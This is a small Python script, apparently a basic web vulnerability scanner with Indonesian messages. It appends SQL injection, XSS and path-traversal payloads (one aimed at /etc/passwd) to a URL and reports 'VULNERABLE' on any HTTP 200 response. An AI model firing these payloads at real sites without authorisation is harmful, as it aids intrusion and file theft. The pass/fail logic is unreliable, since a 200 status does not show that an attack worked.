import requests

def test_payload(url):
    payloads = [
        "' OR 1=1 --",  # SQL Injection payload
        "<script>alert('XSS')</script>",  # XSS payload
        "../../../../../../etc/passwd",  # LFI payload
    ]
    
    payload_tested = []
    for payload in payloads:
        test_url = url + payload
        try:
            r = requests.get(test_url, timeout=5)
            if r.status_code == 200:
                print(f"🔥 Payload berhasil dijalankan dengan: {payload}")
                payload_tested.append({"payload": payload, "result": "VULNERABLE"})
            else:
                print(f"✅ Payload {payload} tidak berhasil.")
                payload_tested.append({"payload": payload, "result": "Not Vulnerable"})
        except requests.exceptions.RequestException as e:
            print(f"Error saat mengakses URL: {e}")
            continue

    return {"url": url, "payloads_tested": payload_tested}
